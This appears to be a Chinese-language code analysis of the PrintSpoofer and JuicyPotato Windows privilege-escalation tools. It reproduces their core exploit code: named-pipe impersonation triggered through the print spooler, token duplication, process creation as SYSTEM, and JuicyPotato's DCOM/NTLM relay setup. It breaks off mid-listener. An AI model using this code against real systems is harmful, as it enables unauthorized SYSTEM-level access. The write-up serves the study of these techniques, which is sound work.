@@ -1,0 +1,197 @@
+## Details
+我希望掌握POC的细节，所以会结合代码分析`PrintSpoofer`和`JuicyPotato`内部的：
+  * `CreateProcessWithTokenW` & `CreateProcessAsUserW`
+  * Named pipe `ImpersonateNamedPipeClient`
+  * 触发DCOM call -- `CoGetInstanceFromIStorage`
+  * SSPI本地NTLM协商 -- `AcceptSecurityContext`
+为了突出重点，后面代码会删除错误处理，参数处理等，只保留骨干
+### PrintSpoofer
+主函数中的流程非常清晰
+    // 探测是否存在SeImpersonatePrivilege，并enable
+    CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME);
+    // 生成随机UUID作pipe name
+    GenerateRandomPipeName(&pwszPipeName);
+    // 创建named pipe
+    // 这个管道是异步的(OVERLAPPED I/O)，
+    // 因为内部调用CreateNamedPipe创建时设置了FILE_FLAG_OVERLAPPED
+    hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName);
+    // 调用named pipe server的ConnectNamedPipe等待client连接
+    // 创建event并返回，后面用来做同步(异步回调)
+    hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe);
+    // 创建新线程，调用RpcOpenPrinter连接named pipe
+    hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName);
+    // 等待spoolsv连接
+    dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
+    // ImpersonateNamedPipeClient + CreateProcessAsUserW
+    GetSystem(hSpoolPipe);
+#### CheckAndEnablePrivilege
+`CheckAndEnablePrivilege`中首先获取当前进程token
+调用了两次`GetTokenInformation`，这是win32api编程的惯例，第一次传递的LPVOID为NULL，此时会返回`ERROR_INSUFFICIENT_BUFFER`，函数会将所需的buffer大小写入`ReturnLength`参数指向的地址（`&dwTokenPrivilegesSize`），这样就可以获知所需的buffer大小并动态分配了
+    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
+    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, dwTokenPrivilegesSize, &dwTokenPrivilegesSize)) {
+        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
+            wprintf(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
+            goto cleanup;
+        }
+    }
+    pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwTokenPrivilegesSize);
+    if (!pTokenPrivileges)
+        goto cleanup;
+    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenPrivilegesSize, &dwTokenPrivilegesSize)) {
+        wprintf(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
+        goto cleanup;
+    }
+后面遍历了token的所有privilege并查询所需的是否存在，查询到后会调用`AdjustTokenPrivileges`启用
+    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
+#### CreateSpoolNamedPipe
+`CreateSpoolNamedPipe`创建命名管道，先创建了安全描述符，设置允许任何客户端访问
+    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+    ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL);
+后面创建named pipe时设置了`FILE_FLAG_OVERLAPPED`，也就是Windows中OVERLAPPED I/O的概念
+为什么是OVERLAPPED，它的意思是CPU操作和I/O操作可以重叠，其实也就是异步I/O。这个模型是对每个I/O操作创建一个新线程，性能较差，所以Windows后面有了IOCP
+    StringCchPrintf(pwszPipeFullname, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", pwszPipeName);
+    hPipe = CreateNamedPipe(pwszPipeFullname, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
+`CreateNamedPipe`的签名
+    WINBASEAPI
+    HANDLE
+    WINAPI
+    CreateNamedPipeW(
+        _In_ LPCWSTR lpName,
+        _In_ DWORD dwOpenMode,
+        _In_ DWORD dwPipeMode,
+        _In_ DWORD nMaxInstances,
+        _In_ DWORD nOutBufferSize,
+        _In_ DWORD nInBufferSize,
+        _In_ DWORD nDefaultTimeOut,
+        _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes
+        );
+`ConnectSpoolNamedPipe`启动了named pipe
+server的accept，创建event并传递。正常情况下`ConnectNamedPipe`是个阻塞操作，但前文设置了OVERLAPPED
+I/O，故会直接返回，操作是否完成直接查询event即可
+    OVERLAPPED ol = { 0 };
+    hPipeEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+    ol.hEvent = hPipeEvent;
+    ConnectNamedPipe(hPipe, &ol)
+#### TriggerNamedPipeConnection
+`TriggerNamedPipeConnection`创建新线程，调用`RpcRemoteFindFirstPrinterChangeNotificationEx`连接named
+pipe
+    CreateThread(NULL, 0, TriggerNamedPipeConnectionThread, pwszPipeName, 0, &dwThreadId);
+    // TriggerNamedPipeConnectionThread
+    StringCchPrintf(pwszTargetServer, MAX_PATH, L"\\\\%ws", pwszComputerName);
+    StringCchPrintf(pwszCaptureServer, MAX_PATH, L"\\\\%ws/pipe/%ws", pwszComputerName, pwszPipeName);
+    RpcTryExcept
+    {
+        if (RpcOpenPrinter(pwszTargetServer, &hPrinter, NULL, &devmodeContainer, 0) == RPC_S_OK)
+        {
+            RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, pwszCaptureServer, 0, NULL);
+            RpcClosePrinter(&hPrinter);
+        }
+    }
+    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
+    {
+        // Expect RPC_S_SERVER_UNAVAILABLE
+    }
+    RpcEndExcept;
+接着等待5s，然后调用`GetSystem`
+#### ImpersonateNamedPipeClient
+`GetSystem`中
+首先调用`ImpersonateNamedPipeClient`，调用成功后当前 **线程** 的安全上下文切换为client token的安全上下文
+    ImpersonateNamedPipeClient(hPipe);
+注意切换的是线程的上下文，所以这里调用`CreateProcess`还是用原进程的上下文
+> CreateProcessA function
+>
+> Creates a new process and its primary thread. The new process runs in the
+> security context of the calling process.
+>
+> If the calling process is impersonating another user, the new process uses
+> the token for the calling process, not the impersonation token. To run the
+> new process in the security context of the user represented by the
+> impersonation token, use the
+> [CreateProcessAsUser](https://docs.microsoft.com/windows/desktop/api/processthreadsapi/nf-> processthreadsapi-createprocessasusera) or
+> [CreateProcessWithLogonW](https://docs.microsoft.com/windows/desktop/api/winbase/nf-> winbase-createprocesswithlogonw) function.
+接着获取当前线程安全上下文的令牌
+    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken);
+#### DuplicateTokenEx
+复制一个新的，使用了`DuplicateTokenEx`创建primary令牌，如果是`DuplicateToken`的话只能创建impersonation令牌，后面就不能调用`CreateProcessAsUser`了
+为什么要复制令牌，一方面是需要primary令牌，另一方面`CreateProcessXXX`的第一个入参必须有以下权限`TOKEN_QUERY,
+TOKEN_DUPLICATE, TOKEN_ASSIGN_PRIMARY`，通过`DuplicateToken`直接赋予复制的令牌`ALL_ACCESS`
+    DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup);
+如果通过CLI传递了sessionID的话，就在指定的session中开启新进程，高版本Windows中通过`qwinsta`查看
+    if (g_dwSessionId)
+        SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD));
+下面这一段做了一些创建新进程的细节配置，删掉也能执行
+`WinSta0\\Default`是交互window station唯一的名字
+    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
+    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;
+    GetSystemDirectory(pwszCurrentDirectory, MAX_PATH);
+    CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE);
+    STARTUPINFO si = { 0 };
+    si.cb = sizeof(STARTUPINFO);
+    si.lpDesktop = const_cast(L"WinSta0\\Default");
+#### CreateProcessAsUserW & CreateProcessWithTokenW
+最后调用`CreateProcessAsUserW`启动新进程
+    CreateProcessAsUserW(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi);
+调用`CreateWithTokenW`也是一样
+    CreateProcessWithTokenW(hSystemTokenDup, 0, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi)
+配置项一下几个必填，`CreateProcessWithTokenW`必定会启动新console，在某些操作时非常不方便，解决的话只能创建父子进程间的匿名管道接收输出（比如T00ls上WebShell版JuicyPotato就是这个原理）
+    CreateProcessAsUserW(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+    CreateProcessWithTokenW(hSystemTokenDup, 0, NULL, g_pwszCommandLine, 0, NULL, NULL, &si, &pi);
+### JuicyPotato
+JuicyPotato的流程相对更复杂
+    PotatoAPI* test = new PotatoAPI();
+    // 创建新线程监听，处理COM service的NTLM认证过程
+    test->startCOMListenerThread();
+    // 创建新线程同时中继到RPC
+    test->startRPCConnectionThread();
+    test->triggerDCOM();
+    // 获取当前进程token
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
+    // enable privilege
+    EnablePriv(hToken, SE_IMPERSONATE_NAME);
+    EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
+    // 通过SecurityContext获取access token
+    QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);
+    // 复制token
+    DuplicateTokenEx(
+        elevated_token,
+        TOKEN_ALL_ACCESS,
+        NULL,
+        SecurityImpersonation,
+        TokenPrimary,
+        &duped_token);
+    if (*processtype == 't' || *processtype == '*')
+        CreateProcessWithTokenW(duped_token, 0, processname, processargs, 0, NULL, NULL, &si, &pi);
+    if (*processtype == 'u' || *processtype == '*')
+        CreateProcessAsUserW(duped_token, processname, command, nullptr, nullptr, FALSE, 0, nullptr, L"C:\\", &si, &pi);
+#### PotatoAPI类定义
+    class PotatoAPI {
+    private:
+        BlockingQueue* comSendQ;
+        BlockingQueue* rpcSendQ;
+        static DWORD WINAPI staticStartRPCConnection(void * Param);
+        static DWORD WINAPI staticStartCOMListener(void * Param);
+        static int newConnection;
+        int processNtlmBytes(char* bytes, int len);
+        int findNTLMBytes(char * bytes, int len);
+    public:
+        PotatoAPI(void);
+        int startRPCConnection(void);
+        DWORD startRPCConnectionThread();
+        DWORD startCOMListenerThread();
+        int startCOMListener(void);
+        int triggerDCOM();
+        LocalNegotiator *negotiator;
+        SOCKET ListenSocket = INVALID_SOCKET;
+        SOCKET ClientSocket = INVALID_SOCKET;
+        SOCKET ConnectSocket = INVALID_SOCKET;
+    };
+#### startCOMListener
+开启新线程监听COM server端口，默认随机
+WinSock编程, 设置了端口复用，然后bind and listen；用select做多路复用
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    struct addrinfo hints;
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    hints.ai_flags = AI_PASSIVE;
+    getaddrinfo(NULL, dcom_port, &hints, &result);
